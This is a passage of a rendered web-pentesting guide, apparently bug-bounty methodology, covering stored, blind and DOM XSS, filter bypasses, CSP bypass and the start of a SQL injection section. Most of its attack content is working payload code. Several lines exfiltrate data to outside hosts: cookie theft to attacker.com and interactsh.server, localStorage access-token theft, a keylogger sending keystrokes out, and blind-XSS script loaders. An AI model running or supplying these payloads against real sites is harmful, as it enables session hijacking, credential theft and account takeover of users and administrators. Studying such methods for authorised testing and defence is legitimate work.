+<h3 id="412-stored-xss">4.1.2 Stored XSS<a class="headerlink" href="#412-stored-xss" title="Permanent link">&para;</a></h3>
+<p>The payload is stored in the database and rendered whenever the page is viewed — by any user, including admins. Impact is higher than reflected because no victim interaction is needed beyond visiting the page, and admin views mean privilege escalation.</p>
+<p><strong>High-value injection points:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>User profile: name, bio, location, website URL
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Comments and reviews
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Uploaded file names (viewed in file browser)
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Support ticket content (viewed by support/admin)
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Message/chat content
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Notification text, address fields, company name
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>Any field that appears in an admin dashboard
+</span></code></pre></div>
+<p><strong>Blind XSS — when you can't see where the input renders:</strong></p>
+<div class="language-javascript highlight"><span class="filename">blind_xss_payloads.js</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">// XSS Hunter — captures cookie, DOM, screenshot, URL where it fired:</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;https://your.xsshunter.io/abc.js&quot;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1">// Fetch-based exfil (bypasses some CSPs):</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://interactsh.server/?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1">// Image-based (no script tag):</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="o">&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="s2">&quot;this.src=&#39;https://interactsh.server/?c=&#39;+document.cookie&quot;</span><span class="o">&gt;</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="c1">// In input field names (fires when admin views form submissions):</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="o">&lt;</span><span class="nx">input</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s1">&#39;&quot;&gt;&lt;script src=&quot;https://xsshunter.io/abc.js&quot;&gt;&lt;/script&gt;&#39;</span><span class="o">&gt;</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="c1">// SVG:</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="o">&lt;</span><span class="nx">svg</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;&lt;/svg&gt;</span>
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">XSS Hunter setup</p>
+<p>Register at <code>xsshunter.trufflesecurity.com</code> (free). Inject your payload in every stored field. If it fires in an admin panel → admin XSS → escalate to ATO.</p>
+</div>
+<hr />
+<h3 id="413-dom-xss">4.1.3 DOM XSS<a class="headerlink" href="#413-dom-xss" title="Permanent link">&para;</a></h3>
+<p>The vulnerability lives entirely in client-side JavaScript. The server never sees the payload — it flows from a <strong>source</strong> (where attacker input enters JS) to a <strong>sink</strong> (where JS interprets it as code or HTML).</p>
+<p><strong>Common sources:</strong>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="w">   </span><span class="c1">// ?param=value</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="w">     </span><span class="c1">// #fragment — most overlooked source</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nb">document</span><span class="p">.</span><span class="nx">referrer</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="nb">window</span><span class="p">.</span><span class="nx">name</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nx">localStorage</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">sessionStorage</span>
+</span></code></pre></div></p>
+<p><strong>Common sinks:</strong>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1">// HTML sinks (classic DOM XSS):</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SOURCE</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">SOURCE</span><span class="p">)</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1">// URL sinks:</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SOURCE</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="nx">element</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SOURCE</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="c1">// Execution sinks:</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="nb">eval</span><span class="p">(</span><span class="nx">SOURCE</span><span class="p">)</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">SOURCE</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="nb">Function</span><span class="p">(</span><span class="nx">SOURCE</span><span class="p">)()</span>
+</span></code></pre></div></p>
+<div class="language-bash highlight"><span class="filename">dom_xss_hunt.sh</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Search JS files for dangerous sinks:</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>grep<span class="w"> </span>-rn<span class="w"> </span><span class="s2">&quot;innerHTML\|outerHTML\|document.write\|eval(&quot;</span><span class="w"> </span>./js_files/
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Manual hash-based test (most common DOM XSS source):</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1"># https://target.com/page#&lt;img src=x onerror=alert(document.domain)&gt;</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1"># https://target.com/search#q=&lt;svg onload=alert(1)&gt;</span>
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">DOM Invader</p>
+<p>Open Burp's embedded browser, enable DOM Invader in extension settings, browse the app. It automatically identifies sources and sinks and reports DOM XSS candidates with canary injection.</p>
+</div>
+<hr />
+<h3 id="414-xss-filter-bypass">4.1.4 XSS Filter Bypass<a class="headerlink" href="#414-xss-filter-bypass" title="Permanent link">&para;</a></h3>
+<p><strong>Systematic approach when basic payloads are blocked:</strong></p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:5"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><input id="__tabbed_1_4" name="__tabbed_1" type="radio" /><input id="__tabbed_1_5" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Tag/case variation</label><label for="__tabbed_1_2">No parentheses</label><label for="__tabbed_1_3">No spaces</label><label for="__tabbed_1_4">Encoding</label><label for="__tabbed_1_5">Event handler variety</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="o">&lt;</span><span class="nx">ScRiPt</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/ScRiPt&gt;</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="o">&lt;</span><span class="nx">IMG</span><span class="w"> </span><span class="nx">SRC</span><span class="o">=</span><span class="nx">X</span><span class="w"> </span><span class="nx">ONERROR</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="o">&lt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="o">&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="sb">`1`</span><span class="o">&gt;</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">;</span><span class="k">throw</span><span class="w"> </span><span class="mf">1</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="p">{</span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">}</span><span class="k">throw</span><span class="w"> </span><span class="mf">1</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="o">&lt;</span><span class="nx">img</span><span class="o">/</span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="o">/</span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="o">&lt;</span><span class="nx">svg</span><span class="o">/</span><span class="nx">onload</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1">// HTML entities:</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="o">&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=&amp;</span><span class="err">#</span><span class="mf">97</span><span class="p">;</span><span class="nx">lert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1">// JS unicode:</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">\u0061lert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c1">// Double URL encode:</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="o">%</span><span class="mf">253</span><span class="nx">Cscript</span><span class="o">%</span><span class="mf">253</span><span class="nx">Ealert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">%</span><span class="mf">253</span><span class="nx">C</span><span class="o">/</span><span class="nx">script</span><span class="o">%</span><span class="mf">253</span><span class="nx">E</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="o">&lt;</span><span class="nx">body</span><span class="w"> </span><span class="nx">onpageshow</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="o">&lt;</span><span class="nx">marquee</span><span class="w"> </span><span class="nx">onstart</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="o">&lt;</span><span class="nx">select</span><span class="w"> </span><span class="nx">autofocus</span><span class="w"> </span><span class="nx">onfocus</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="o">&lt;</span><span class="nx">input</span><span class="w"> </span><span class="nx">autofocus</span><span class="w"> </span><span class="nx">onfocus</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="o">&lt;</span><span class="nx">video</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="o">&lt;</span><span class="nx">audio</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">PortSwigger XSS Cheat Sheet</p>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">portswigger.net/web-security/cross-site-scripting/cheat-sheet</a> — filterable by context and browser. Bookmark this. Use it every time basic payloads fail.</p>
+</div>
+<hr />
+<h3 id="415-xss-to-account-takeover">4.1.5 XSS to Account Takeover<a class="headerlink" href="#415-xss-to-account-takeover" title="Permanent link">&para;</a></h3>
+<p>Escalating beyond <code>alert(1)</code>:</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:4"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><input id="__tabbed_2_3" name="__tabbed_2" type="radio" /><input id="__tabbed_2_4" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">Cookie theft</label><label for="__tabbed_2_2">CSRF via XSS</label><label for="__tabbed_2_3">Token theft</label><label for="__tabbed_2_4">Keylogger</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1">// Redirect with cookie:</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;https://attacker.com/steal?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1">// Fetch (stealthier, no redirect):</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://interactsh.server/?c=&#39;</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">))</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c1">// Note: HttpOnly cookies cannot be stolen via JS — use CSRF instead</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1">// When HttpOnly blocks cookie theft — perform actions as victim:</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/users/me&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">  </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;PUT&#39;</span><span class="p">,</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">  </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">},</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">  </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">email</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;attacker@evil.com&#39;</span><span class="p">}),</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">  </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;include&#39;</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="p">})</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="c1">// Then trigger password reset to attacker email → ATO</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1">// If OAuth/API token in localStorage (not HttpOnly):</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://attacker.com/?t=&#39;</span><span class="o">+</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;access_token&#39;</span><span class="p">))</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;keypress&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="w">  </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://attacker.com/keys?k=&#39;</span><span class="o">+</span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">)</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="p">})</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h3 id="416-csp-bypass">4.1.6 CSP Bypass<a class="headerlink" href="#416-csp-bypass" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">read_csp.sh</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>curl<span class="w"> </span>-sv<span class="w"> </span>https://target.com/<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;content-security-policy&quot;</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="c1"># Then paste policy at: https://csp-evaluator.withgoogle.com/</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Weakness</th>
+<th>Bypass</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>unsafe-inline</code> present</td>
+<td>Inline scripts allowed — basic XSS works</td>
+</tr>
+<tr>
+<td><code>unsafe-eval</code> present</td>
+<td><code>eval()</code> allowed — JS string execution</td>
+</tr>
+<tr>
+<td>Whitelisted CDN with user content</td>
+<td>Upload JS to CDN, load from there</td>
+</tr>
+<tr>
+<td><code>*.google.com</code> in <code>script-src</code></td>
+<td>JSONP endpoints on Google execute JS</td>
+</tr>
+<tr>
+<td>Wildcard subdomain <code>*.target.com</code></td>
+<td>Find XSS on any subdomain</td>
+</tr>
+<tr>
+<td><code>data:</code> in <code>script-src</code></td>
+<td><code>&lt;script src="data:text/javascript,alert(1)"&gt;</code></td>
+</tr>
+<tr>
+<td>Static nonce (not per-request)</td>
+<td>Reuse it</td>
+</tr>
+</tbody>
+</table>
+<div class="language-javascript highlight"><span class="filename">jsonp_csp_bypass.js</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1">// If CSP allows scripts from accounts.google.com:</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//&quot;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="417-xss-checklist">4.1.7 XSS Checklist<a class="headerlink" href="#417-xss-checklist" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>□ Every input field — inject canary string, find reflection point
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>□ URL parameters — all of them, not just obvious ones
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>□ URL hash (#fragment) — DOM XSS source
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>□ HTTP headers reflected in response (User-Agent, Referer)
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>□ File names on upload
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>□ Error messages that reflect input
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>□ Identify rendering context before choosing payload
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>□ Run Dalfox on all parameterized URLs
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>□ Run DOM Invader while manually browsing
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>□ Install XSS Hunter payload in all stored fields
+</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>□ Read CSP header — analyze for bypasses
+</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>□ If XSS found: escalate to ATO (cookie theft, CSRF, token theft)
+</span></code></pre></div>
+<hr />
+<h2 id="42-sql-injection">4.2 SQL Injection<a class="headerlink" href="#42-sql-injection" title="Permanent link">&para;</a></h2>
+<p>User input is incorporated into a SQL query without parameterization. The attacker closes the intended query structure and injects their own SQL. Most common in legacy codebases, search/filter functionality, APIs accepting complex filter params, and <code>ORDER BY</code> clauses.</p>
+<h3 id="421-detection">4.2.1 Detection<a class="headerlink" href="#421-detection" title="Permanent link">&para;</a></h3>
+<p><strong>Probe every input with these first:</strong></p>
+<div class="language-sql highlight"><span class="filename">detection_probes.sql</span><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1">-- String context:</span>
